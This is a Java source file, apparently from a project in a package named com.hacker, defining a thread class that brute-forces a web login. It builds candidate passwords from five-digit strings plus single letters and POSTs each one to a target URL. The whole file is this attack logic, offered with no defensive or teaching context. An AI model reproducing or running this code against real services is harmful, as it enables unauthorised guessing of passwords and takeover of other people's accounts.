package com.hacker;

public class PostThread extends Thread {
    private HttpRequester httpRequester;
    private String url;
    private String[] fiveDigitArr;
    private char[] eachLetterArr;

    public PostThread(HttpRequester httpRequester, String url, char[] eachLetterArr) {
        this.httpRequester = httpRequester;
        this.url = url;
        this.eachLetterArr = eachLetterArr;
    }

    public void setFiveDigitArr(String[] fiveDigitArr) {
        this.fiveDigitArr = fiveDigitArr;
    }

    @Override
    public void run() {
        try {
            for (String fiveDigit : fiveDigitArr) {
                for (char eachLetter : eachLetterArr) {
                    String password = new StringBuilder().append(fiveDigit).append(eachLetter).toString();
                    httpRequester.requestPost(this.url, password);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
